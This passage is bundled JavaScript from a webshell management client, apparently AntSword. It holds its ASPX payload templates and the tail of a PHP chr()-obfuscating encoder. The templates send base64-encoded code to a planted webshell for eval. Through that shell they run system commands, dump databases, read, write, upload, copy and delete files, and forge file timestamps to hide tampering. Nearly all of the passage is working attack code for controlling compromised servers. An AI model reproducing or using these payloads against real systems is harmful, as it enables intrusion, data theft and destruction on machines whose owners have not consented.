	    return 'eVAl(cHr(' + ret.join(').ChR(') + '));';
	  };

	  // 编码并去除多余数据
	  data[pwd] = encode(data._);
	  delete data._;

	  // 返回数据
	  return data;
	};

/***/ },
/* 26 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(global, Buffer) {'use strict';

	var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol ? "symbol" : typeof obj; };

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	//
	// 代码模板::asp
	//

	var iconv = global.require('iconv-lite');

	var ASP = function () {
	  function ASP(opts) {
	    _classCallCheck(this, ASP);

	    this.__opts__ = opts;
	    this.parseTpl(['base', 'command', 'filemanager', 'database/dsn', 'database/mysql', 'database/access', 'database/oracle', 'database/sqlserver', 'database/sqloledb_1', 'database/sqloledb_1_sspi', 'database/microsoft_jet_oledb_4_0']);
	    this.parseEnr([]);
	  }

	  // 格式化函数


	  _createClass(ASP, [{
	    key: 'format',
	    value: function format() {
	      var encode = this.__opts__['encode'] || 'utf8';
	      return {
	        base64: function base64(str) {
	          // 编码
	          var _str_ = iconv.encode(new Buffer(str), encode);
	          return new Buffer(_str_).toString('base64');
	        },
	        // 转换为16进制::编码
	        hex: function hex(b) {
	          var ret = [];
	          var buff = iconv.encode(new Buffer(b), encode);

	          buff.toJSON()['data'].map(function (i) {
	            var _ = i.toString(16);
	            _.length < 2 ? _ = '0' + _ : null;
	            ret.push(_);
	          });

	          return ret.join('').toUpperCase();
	        },
	        // 转换为16进制::不编码
	        buffer: function buffer(b) {
	          var ret = [];

	          b.toJSON()['data'].map(function (i) {
	            var _ = i.toString(16);
	            _.length < 2 ? _ = '0' + _ : null;
	            ret.push(_);
	          });

	          return ret.join('').toUpperCase();
	        }
	      };
	    }

	    // 解析模板

	  }, {
	    key: 'parseTpl',
	    value: function parseTpl(tpl) {
	      var _this = this;

	      var _export = {};

	      // 模板格式化函数
	      var format = this.format();

	      // 加载模板代码
	      tpl.map(function (t) {
	        // 解析模板
	        _this[t.replace(/\//g, '_')] = {};
	        var m = __webpack_require__(27)("./" + t);
	        for (var _ in m) {
	          _this[t.replace(/\//g, '_')][_] = function (c) {
	            // 如果需要参数
	            if ((typeof c === 'undefined' ? 'undefined' : _typeof(c)) === 'object') {
	              return function (argv, success, error, hook) {
	                var data = $.extend({}, c);
	                // 格式化参数

	                var _loop = function _loop(d) {
	                  (data[d].match(/#{([\w\:]+)}/g) || []).map(function (tag) {
	                    var _t = tag.substr(2, tag.length - 3);
	                    // 如果需要字符处理
	                    var _f = _t.split('::');
	                    var _ff = void 0;
	                    if (_f.length > 0 && (_ff = format[_f[0]])) {
	                      // _t = _ff(argv[_f[1]] || _t);
	                      _t = _ff(argv[_f[1]] || '');
	                    } else {
	                      // _t = argv[_t] || _t;
	                      _t = argv[_t] || '';
	                    }
	                    data[d] = data[d].replace(tag, _t);
	                  });
	                };

	                for (var d in data) {
	                  _loop(d);
	                }
	                _this.ajax(data, success, error, hook);
	              };
	            } else {
	              var _ret2 = function () {
	                var data = {
	                  _: c
	                };
	                return {
	                  v: function v(success, error, hook) {
	                    _this.ajax(data, success, error, hook);
	                  }
	                };
	              }();

	              if ((typeof _ret2 === 'undefined' ? 'undefined' : _typeof(_ret2)) === "object") return _ret2.v;
	            }
	          }(m[_]);
	        }
	      });
	    }

	    // 解析编码模块

	  }, {
	    key: 'parseEnr',
	    value: function parseEnr(edr) {
	      var encoder = {
	        // 默认编码器
	        default: function _default(pwd, data) {
	          data[pwd] = data['_'];
	          delete data['_'];
	          return data;
	        }
	      };
	      edr.map(function (_) {
	        encoder[_] = __webpack_require__(41)("./" + _);
	      });
	      this.__encoder__ = encoder;
	    }
	  }, {
	    key: 'ajax',
	    value: function ajax(code, success, error, hook) {
	      var post = $.extend({}, code);
	      // 随机ID(用于监听数据来源)
	      var hash = (String(+new Date()) + String(Math.random())).substr(10, 10).replace('.', '_');
	      var tag_s = '-=:{';
	      var tag_e = '}:=-';
	      var encode = this.__opts__['encode'] || 'utf8';

	      var code_base64 = this.format()['base64'](post['_']);

	      post['_'] = 'Response.Write("' + tag_s + '");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("' + code_base64 + '")),"unsafe");}catch(err){Response.Write("ERROR:// "+err.message);}Response.Write("' + tag_e + '");Response.End();';

	      // 编码处理模板
	      var encoder = this.__encoder__[this.__opts__['encoder'] || 'default'] || this.__encoder__['default'];
	      var data = encoder(this.__opts__['pwd'], post);

	      // 监听数据返回
	      antSword['ipcRenderer']
	      // 请求完毕返回数据{text,buff}
	      .on('request-' + hash, function (event, arg) {
	        success(arg['text'], arg['buff']);
	      })
	      // HTTP请求返回字节流
	      .on('request-chunk-' + hash, function (event, ret) {
	        hook ? hook(ret) : null;
	      })
	      // 数据请求错误
	      .on('request-error-' + hash, function (event, ret) {
	        error ? error(ret) : null;
	      })
	      // 发送请求数据
	      .send('request', {
	        url: this.__opts__['url'],
	        hash: hash,
	        data: data,
	        tag_s: tag_s,
	        tag_e: tag_e,
	        encode: encode
	      });
	    }
	  }]);

	  return ASP;
	}();

	module.exports = ASP;
	/* WEBPACK VAR INJECTION */}.call(exports, (function() { return this; }()), __webpack_require__(5).Buffer))

/***/ },
/* 27 */
/***/ function(module, exports, __webpack_require__) {

	var map = {
		"./argv": 28,
		"./argv.jsx": 28,
		"./base": 29,
		"./base.jsx": 29,
		"./command": 30,
		"./command.jsx": 30,
		"./database/access": 31,
		"./database/access.jsx": 31,
		"./database/default": 32,
		"./database/default.jsx": 32,
		"./database/dsn": 33,
		"./database/dsn.jsx": 33,
		"./database/microsoft_jet_oledb_4_0": 34,
		"./database/microsoft_jet_oledb_4_0.jsx": 34,
		"./database/mysql": 35,
		"./database/mysql.jsx": 35,
		"./database/oracle": 36,
		"./database/oracle.jsx": 36,
		"./database/sqloledb_1": 37,
		"./database/sqloledb_1.jsx": 37,
		"./database/sqloledb_1_sspi": 38,
		"./database/sqloledb_1_sspi.jsx": 38,
		"./database/sqlserver": 39,
		"./database/sqlserver.jsx": 39,
		"./filemanager": 40,
		"./filemanager.jsx": 40
	};
	function webpackContext(req) {
		return __webpack_require__(webpackContextResolve(req));
	};
	function webpackContextResolve(req) {
		return map[req] || (function() { throw new Error("Cannot find module '" + req + "'.") }());
	};
	webpackContext.keys = function webpackContextKeys() {
		return Object.keys(map);
	};
	webpackContext.resolve = webpackContextResolve;
	module.exports = webpackContext;
	webpackContext.id = 27;


/***/ },
/* 28 */
/***/ function(module, exports) {

	"use strict";

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});
	/**
	 * 在模板中使用
	 * 1. 加载需要的参数列表： import { arg1, arg2, arg3 } from './argv';
	 * 2. 嵌入代码参数中：codes={[arg1]: `echo "${arg1}";`}...
	 **/

	var random = function random() {
	  return "0x" + (Math.random() + Math.random()).toString(16).substr(2);
	};

	var arg1 = exports.arg1 = random();
	var arg2 = exports.arg2 = random();
	var arg3 = exports.arg3 = random();
	var arg4 = exports.arg4 = random();
	var arg5 = exports.arg5 = random();
	var arg6 = exports.arg6 = random();

/***/ },
/* 29 */
/***/ function(module, exports) {

	"use strict";

	//
	// 基础信息模板
	// 获取：当前路径、磁盘列表
	//

	module.exports = {
	  info: "var c=System.IO.Directory.GetLogicalDrives();Response.Write(Server.MapPath(\".\")+\"  \");for(var i=0;i<=c.length-1;i++)Response.Write(c[i][0]+\":\");"
	};

/***/ },
/* 30 */
/***/ function(module, exports, __webpack_require__) {

	"use strict";

	var _exec;

	var _argv = __webpack_require__(28);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// 命令执行模板
	//

	module.exports = {
	  exec: (_exec = {
	    _: "var c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item[\"" + _argv.arg1 + "\"])));var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments=\"/c \"+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item[\"" + _argv.arg2 + "\"]));e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd()+EI.ReadToEnd());"
	  }, _defineProperty(_exec, _argv.arg1, "#{base64::bin}"), _defineProperty(_exec, _argv.arg2, "#{base64::cmd}"), _exec)
	};

/***/ },
/* 31 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	var _show_databases, _show_columns, _query;

	var _argv = __webpack_require__(28);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// ASPX::access数据库驱动代码模板
	//

	module.exports = {
	  // 显示所有数据库
	  show_databases: (_show_databases = {
	    _: 'var Conn=new ActiveXObject("Adodb.connection");Conn.Open(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg1 + '"])));Response.Write(Request.Item["' + _argv.arg2 + '"]+"\\t");Conn.Close();'
	  }, _defineProperty(_show_databases, _argv.arg1, '#{base64::conn}'), _defineProperty(_show_databases, _argv.arg2, '#{dbname}'), _show_databases),
	  // 显示数据库所有表
	  show_tables: _defineProperty({
	    _: 'var Conn=new ActiveXObject("Adodb.connection");Conn.ConnectionString=System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg1 + '"]));Conn.ConnectionTimeout=10;Conn.Open();var Rs=Conn.OpenSchema(20);var x:String="";while(!Rs.EOF && !Rs.BOF){if(Rs.Fields(3).Value=="TABLE"){x+=Rs.Fields(2).Value+"\\t";}Rs.MoveNext();}Rs.Close();Conn.Close();Response.Write(x);'
	  }, _argv.arg1, '#{base64::conn}'),
	  // 显示表字段
	  show_columns: (_show_columns = {
	    _: 'function TN(n:Int32):String{switch(n){case 2:return "smallint";case 3:return "int";case 4:return "real";case 5:return "float";case 6:return "money";case 7:return "datetime";case 11:return "bit";case 12:return "variant";case 16:return "tinyint";case 17:return "tinyint";case 20:return "bigint";case 72:return "unique";case 128:return "binary";case 129:return "char";case 130:return "nchar";case 131:return "numeric";case 135:return "datetime";case 200:return "varchar";case 201:return "text";case 202:return "nvarchar";case 203:return "ntext";case 204:return "varbinary";case 205:return "image";default:return n;}}var Conn=new ActiveXObject("Adodb.connection");Conn.Open(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg1 + '"])));var Rs=new ActiveXObject("ADODB.Recordset");Rs.Open(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg2 + '"])),Conn,1,1);var c:Int32;for(c=0;c<=Rs.Fields.Count-1;c++){Response.Write(Rs.Fields.Item(c).Name+" ("+TN(Rs.Fields.Item(c).Type)+")\\t");}Rs.Close();Conn.Close();'
	  }, _defineProperty(_show_columns, _argv.arg1, '#{base64::conn}'), _defineProperty(_show_columns, _argv.arg2, '#{base64::table}'), _show_columns),
	  // 执行SQL语句
	  query: (_query = {
	    _: 'var Conn=new ActiveXObject("Adodb.connection");var strSQL:String=System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg2 + '"]));Conn.ConnectionString=System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg1 + '"]));Conn.ConnectionTimeout=10;Conn.Open();var CO:String="\\t|\\t",RN:String="\\r\\n",Dat:String;var Rs=Conn.Execute(strSQL);var i:Int32=Rs.Fields.Count,c:Int32;for(c=0;c<i;c++){Response.Write(Rs.Fields(c).Name+CO);}Response.Write(RN);while(!Rs.EOF && !Rs.BOF){for(c=0;c<i;c++){Dat=Rs.Fields(c).Value;Response.Write(Dat);Response.Write(CO);}Response.Write(RN);Rs.MoveNext();}Conn.Close();'
	  }, _defineProperty(_query, _argv.arg1, '#{base64::conn}'), _defineProperty(_query, _argv.arg2, '#{base64::sql}'), _query)
	};

/***/ },
/* 32 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	var _show_columns, _query;

	var _argv = __webpack_require__(28);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// 默认数据库操作代码模板
	//

	module.exports = {
	  // 显示所有数据库
	  show_databases: _defineProperty({
	    _: 'var Conn=new ActiveXObject("Adodb.connection");Conn.Open(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg1 + '"])));Response.Write("[ADO DATABASE]\\t");Conn.Close();'
	  }, _argv.arg1, '#{base64::conn}'),
	  // 显示数据库所有表
	  show_tables: _defineProperty({
	    _: 'var Conn=new ActiveXObject("Adodb.connection");Conn.ConnectionString=System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg1 + '"]));Conn.ConnectionTimeout=10;Conn.Open();var Rs=Conn.OpenSchema(20);var x:String="";while(!Rs.EOF && !Rs.BOF){if(Rs.Fields(3).Value=="TABLE"){x+=Rs.Fields(2).Value+"\\t";}Rs.MoveNext();}Rs.Close();Conn.Close();Response.Write(x);'
	  }, _argv.arg1, '#{base64::conn}'),
	  // 显示表字段
	  show_columns: (_show_columns = {
	    _: 'function TN(n:Int32):String{switch(n){case 2:return "smallint";case 3:return "int";case 4:return "real";case 5:return "float";case 6:return "money";case 7:return "datetime";case 11:return "bit";case 12:return "variant";case 16:return "tinyint";case 17:return "tinyint";case 20:return "bigint";case 72:return "unique";case 128:return "binary";case 129:return "char";case 130:return "nchar";case 131:return "numeric";case 135:return "datetime";case 200:return "varchar";case 201:return "text";case 202:return "nvarchar";case 203:return "ntext";case 204:return "varbinary";case 205:return "image";default:return n;}}var Conn=new ActiveXObject("Adodb.connection");Conn.Open(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg1 + '"])));var Rs=new ActiveXObject("ADODB.Recordset");Rs.Open(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg2 + '"])),Conn,1,1);var c:Int32;for(c=0;c<=Rs.Fields.Count-1;c++){Response.Write(Rs.Fields.Item(c).Name+" ("+TN(Rs.Fields.Item(c).Type)+")\\t");}Rs.Close();Conn.Close();'
	  }, _defineProperty(_show_columns, _argv.arg1, '#{base64::conn}'), _defineProperty(_show_columns, _argv.arg2, '#{base64::table}'), _show_columns),
	  // 执行SQL语句
	  query: (_query = {
	    _: 'var Conn=new ActiveXObject("Adodb.connection");var strSQL:String=System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg2 + '"]));Conn.ConnectionString=System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg1 + '"]));Conn.ConnectionTimeout=10;Conn.Open();var CO:String="\\t|\\t",RN:String="\\r\\n",Dat:String;var Rs=Conn.Execute(strSQL);var i:Int32=Rs.Fields.Count,c:Int32;for(c=0;c<i;c++){Response.Write(Rs.Fields(c).Name+CO);}Response.Write(RN);while(!Rs.EOF && !Rs.BOF){for(c=0;c<i;c++){Dat=Rs.Fields(c).Value;Response.Write(Dat);Response.Write(CO);}Response.Write(RN);Rs.MoveNext();}Conn.Close();'
	  }, _defineProperty(_query, _argv.arg1, '#{base64::conn}'), _defineProperty(_query, _argv.arg2, '#{base64::sql}'), _query)
	};

/***/ },
/* 33 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	//
	// ASPX::DNS数据库驱动代码模板
	//

	module.exports = __webpack_require__(32);

/***/ },
/* 34 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	//
	// ASPX::microsoft_jet_oledb_4_0数据库驱动代码模板
	//

	module.exports = __webpack_require__(31);

/***/ },
/* 35 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	//
	// ASPX::mysql数据库驱动代码模板
	//

	module.exports = __webpack_require__(32);

/***/ },
/* 36 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	var _show_columns, _query;

	var _argv = __webpack_require__(28);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// ASPX::oracle数据库驱动代码模板
	//

	module.exports = {
	  // 显示所有数据库
	  show_databases: _defineProperty({
	    _: 'var Conn=new ActiveXObject("Adodb.connection");Conn.Open(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg1 + '"])));Response.Write("[ADO DATABASE]\\t");Conn.Close();'
	  }, _argv.arg1, '#{base64::conn}'),
	  // 显示数据库所有表
	  show_tables: _defineProperty({
	    _: 'var Conn=new ActiveXObject("Adodb.connection");Conn.Open(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg1 + '"])));var Rs=new ActiveXObject("ADODB.Recordset");Rs.Open("SELECT TABLE_NAME FROM ALL_TABLES",Conn,1,1);while(!Rs.EOF && !Rs.BOF){Response.Write(Rs.Fields(0).Value+"\\t");Rs.MoveNext();}Rs.Close();Conn.Close();'
	  }, _argv.arg1, '#{base64::conn}'),
	  // 显示表字段
	  show_columns: (_show_columns = {
	    _: 'function TN(n:Int32):String{switch(n){case 2:return "smallint";case 3:return "int";case 4:return "real";case 5:return "float";case 6:return "money";case 7:return "datetime";case 11:return "bit";case 12:return "variant";case 16:return "tinyint";case 17:return "tinyint";case 20:return "bigint";case 72:return "unique";case 128:return "binary";case 129:return "char";case 130:return "nchar";case 131:return "numeric";case 135:return "datetime";case 200:return "varchar";case 201:return "text";case 202:return "nvarchar";case 203:return "ntext";case 204:return "varbinary";case 205:return "image";default:return n;}}var Conn=new ActiveXObject("Adodb.connection");Conn.Open(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg1 + '"])));var Rs=new ActiveXObject("ADODB.Recordset");Rs.Open(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg2 + '"])),Conn,1,1);var c:Int32;for(c=0;c<=Rs.Fields.Count-1;c++){Response.Write(Rs.Fields.Item(c).Name+" ("+TN(Rs.Fields.Item(c).Type)+")\\t");}Rs.Close();Conn.Close();'
	  }, _defineProperty(_show_columns, _argv.arg1, '#{base64::conn}'), _defineProperty(_show_columns, _argv.arg2, '#{base64::table}'), _show_columns),
	  // 执行SQL语句
	  query: (_query = {
	    _: 'var Conn=new ActiveXObject("Adodb.connection");var strSQL:String=System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg2 + '"]));Conn.ConnectionString=System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg1 + '"]));Conn.ConnectionTimeout=10;Conn.Open();var CO:String="\\t|\\t",RN:String="\\r\\n",Dat:String;var Rs=Conn.Execute(strSQL);var i:Int32=Rs.Fields.Count,c:Int32;for(c=0;c<i;c++){Response.Write(Rs.Fields(c).Name+CO);}Response.Write(RN);while(!Rs.EOF && !Rs.BOF){for(c=0;c<i;c++){Dat=Rs.Fields(c).Value;Response.Write(Dat);Response.Write(CO);}Response.Write(RN);Rs.MoveNext();}Conn.Close();'
	  }, _defineProperty(_query, _argv.arg1, '#{base64::conn}'), _defineProperty(_query, _argv.arg2, '#{base64::sql}'), _query)
	};

/***/ },
/* 37 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	//
	// ASPX::sqloledb_1数据库驱动代码模板
	//

	module.exports = __webpack_require__(32);

/***/ },
/* 38 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	//
	// ASPX::sqloledb_1_sspi数据库驱动代码模板
	//

	module.exports = __webpack_require__(32);

/***/ },
/* 39 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	var _show_tables, _show_columns, _query;

	var _argv = __webpack_require__(28);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// ASPX::mysql数据库驱动代码模板
	//

	module.exports = {
	  // 显示所有数据库
	  show_databases: _defineProperty({
	    _: 'var Conn=new ActiveXObject("Adodb.connection");Conn.Open(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg1 + '"])));var Rs=new ActiveXObject("ADODB.Recordset");Rs.Open("SELECT [name] FROM master.dbo.sysdatabases ORDER BY 1",Conn,1,1);while(!Rs.EOF && !Rs.BOF){Response.Write(Rs.Fields(0).Value+"\\t");Rs.MoveNext();}Rs.Close();Conn.Close();'
	  }, _argv.arg1, '#{base64::conn}'),
	  // 显示数据库所有表
	  show_tables: (_show_tables = {
	    _: 'var Conn=new ActiveXObject("Adodb.connection");Conn.Open(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg1 + '"])));var Rs=new ActiveXObject("ADODB.Recordset");Rs.Open("USE ["+Request.Item["' + _argv.arg2 + '"]+"];SELECT [name] FROM sysobjects WHERE (xtype=\'U\') ORDER BY 1",Conn,1,1);while(!Rs.EOF && !Rs.BOF){Response.Write(Rs.Fields(0).Value+"\\t");Rs.MoveNext();}Rs.Close();Conn.Close();'
	  }, _defineProperty(_show_tables, _argv.arg1, '#{base64::conn}'), _defineProperty(_show_tables, _argv.arg2, '#{dbname}'), _show_tables),
	  // 显示表字段
	  show_columns: (_show_columns = {
	    _: 'var Conn=new ActiveXObject("Adodb.connection");Conn.Open(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg1 + '"])));var Rs=new ActiveXObject("ADODB.Recordset");Rs.Open(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg2 + '"])),Conn,1,1);while(!Rs.EOF && !Rs.BOF){Response.Write(Rs.Fields(0).Value+" ("+Rs.Fields(1).Value+")\\t");Rs.MoveNext();}Rs.Close();Conn.Close();'
	  }, _defineProperty(_show_columns, _argv.arg1, '#{base64::conn}'), _defineProperty(_show_columns, _argv.arg2, '#{base64::sql}'), _show_columns),
	  // 执行SQL语句
	  query: (_query = {
	    _: 'var Conn=new ActiveXObject("Adodb.connection");var strSQL:String=System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg2 + '"]));Conn.ConnectionString=System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["' + _argv.arg1 + '"]));Conn.ConnectionTimeout=10;Conn.Open();var CO:String="\\t|\\t",RN:String="\\r\\n",Dat:String;Conn.DefaultDatabase="' + _argv.arg3 + '";var Rs=Conn.Execute(strSQL);var i:Int32=Rs.Fields.Count,c:Int32;for(c=0;c<i;c++){Response.Write(Rs.Fields(c).Name+CO);}Response.Write(RN);while(!Rs.EOF && !Rs.BOF){for(c=0;c<i;c++){Dat=Rs.Fields(c).Value;Response.Write(Dat);Response.Write(CO);}Response.Write(RN);Rs.MoveNext();}Conn.Close();'
	  }, _defineProperty(_query, _argv.arg1, '#{base64::conn}'), _defineProperty(_query, _argv.arg2, '#{base64::sql}'), _defineProperty(_query, _argv.arg3, '#{dbname}'), _query)
	};

/***/ },
/* 40 */
/***/ function(module, exports, __webpack_require__) {

	"use strict";

	var _create_file, _copy, _upload_file, _rename, _retime, _wget;

	var _argv = __webpack_require__(28);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// 文件管理模板
	//

	module.exports = {
	  dir: _defineProperty({
	    _: "var D=System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item[\"" + _argv.arg1 + "\"]));var m=new System.IO.DirectoryInfo(D);var s=m.GetDirectories();var P:String;var i;function T(p:String):String{return System.IO.File.GetLastWriteTime(p).ToString(\"yyyy-MM-dd HH:mm:ss\");}for(i in s){P=D+s[i].Name;Response.Write(s[i].Name+\"/\t\"+T(P)+\"\t0\t-\n\");}s=m.GetFiles();for(i in s){P=D+s[i].Name;Response.Write(s[i].Name+\"\t\"+T(P)+\"\t\"+s[i].Length+\"\t-\n\");}"
	  }, _argv.arg1, "#{base64::path}"),

	  delete: _defineProperty({
	    _: "var P:String=System.Convert.FromBase64String(Request.Item[\"" + _argv.arg1 + "\"]);if(System.IO.Directory.Exists(P)){System.IO.Directory.Delete(P,true);}else{System.IO.File.Delete(P);}Response.Write(\"1\");"
	  }, _argv.arg1, "#{base64::path}"),

	  create_file: (_create_file = {
	    _: "var P=System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item[\"" + _argv.arg1 + "\"]));var m=new System.IO.StreamWriter(P,false,Encoding.Default);m.Write(System.Convert.FromBase64String(Request.Item[\"" + _argv.arg2 + "\"]));m.Close();Response.Write(\"1\");"
	  }, _defineProperty(_create_file, _argv.arg1, "#{base64::path}"), _defineProperty(_create_file, _argv.arg2, "#{base64::content}"), _create_file),

	  read_file: _defineProperty({
	    _: "var P=System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item[\"" + _argv.arg1 + "\"]));var m=new System.IO.StreamReader(P,Encoding.Default);Response.Write(m.ReadToEnd());m.Close();"
	  }, _argv.arg1, "#{base64::path}"),

	  copy: (_copy = {
	    _: "var S=System.Convert.FromBase64String(Request.Item[\"" + _argv.arg1 + "\"]);var D=System.Convert.FromBase64String(Request.Item[\"" + _argv.arg2 + "\"]);function cp(S:String,D:String){if(System.IO.Directory.Exists(S)){var m=new System.IO.DirectoryInfo(S);var i;var f=m.GetFiles();var d=m.GetDirectories();System.IO.Directory.CreateDirectory(D);for (i in f)System.IO.File.Copy(S+\"\\\"+f[i].Name,D+\"\\\"+f[i].Name);for (i in d)cp(S+\"\\\"+d[i].Name,D+\"\\\"+d[i].Name);}else{System.IO.File.Copy(S,D);}}cp(S,D);Response.Write(\"1\");"
	  }, _defineProperty(_copy, _argv.arg1, "#{base64::path}"), _defineProperty(_copy, _argv.arg2, "#{base64::target}"), _copy),

	  download_file: _defineProperty({
	    _: "Response.WriteFile(System.Convert.FromBase64String(Request.Item[\"z1\"]));"
	  }, _argv.arg1, "#{base64::path}"),

	  upload_file: (_upload_file = {
	    _:
	    // `var P:String=System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));var Z:String=Request.Item["${arg2}"];var B:byte[]=new byte[Z.Length/2];for(var i=0;i<Z.Length;i+=2){B[i/2]=byte(Convert.ToInt32(Z.Substring(i,2),16));}var fs:System.IO.FileStream=new System.IO.FileStream(P,System.IO.FileMode.Create);fs.Write(B,0,B.Length);fs.Close();Response.Write("1");`,
	    // 修改写入模式Create->Append
	    "var P:String=System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item[\"" + _argv.arg1 + "\"]));var Z:String=Request.Item[\"" + _argv.arg2 + "\"];var B:byte[]=new byte[Z.Length/2];for(var i=0;i<Z.Length;i+=2){B[i/2]=byte(Convert.ToInt32(Z.Substring(i,2),16));}var fs:System.IO.FileStream=new System.IO.FileStream(P,System.IO.FileMode.Append);fs.Write(B,0,B.Length);fs.Close();Response.Write(\"1\");"
	  }, _defineProperty(_upload_file, _argv.arg1, "#{base64::path}"), _defineProperty(_upload_file, _argv.arg2, "#{buffer::content}"), _upload_file),

	  rename: (_rename = {
	    _: "var src=System.Convert.FromBase64String(Request.Item[\"" + _argv.arg1 + "\"]),dst=System.Convert.FromBase64String(Request.Item[\"" + _argv.arg2 + "\"]);if (System.IO.Directory.Exists(src)){System.IO.Directory.Move(src,dst);}else{System.IO.File.Move(src,dst);}Response.Write(\"1\");"
	  }, _defineProperty(_rename, _argv.arg1, "#{base64::path}"), _defineProperty(_rename, _argv.arg2, "#{base64::name}"), _rename),

	  retime: (_retime = {
	    _: "var DD=System.Convert.FromBase64String(Request.Item[\"" + _argv.arg1 + "\"]),TM=System.Convert.FromBase64String(Request.Item[\"" + _argv.arg2 + "\"]);if(System.IO.Directory.Exists(DD)){System.IO.Directory.SetCreationTime(DD,TM);System.IO.Directory.SetLastWriteTime(DD,TM);System.IO.Directory.SetLastAccessTime(DD,TM);}else{System.IO.File.SetCreationTime(DD,TM);System.IO.File.SetLastWriteTime(DD,TM);System.IO.File.SetLastAccessTime(DD,TM);}Response.Write(\"1\");"
	  }, _defineProperty(_retime, _argv.arg1, "#{base64::path}"), _defineProperty(_retime, _argv.arg2, "#{base64::time}"), _retime),

	  mkdir: _defineProperty({
	    _: "var D=System.Convert.FromBase64String(Request.Item[\"" + _argv.arg1 + "\"]);System.IO.Directory.CreateDirectory(D);Response.Write(\"1\");"
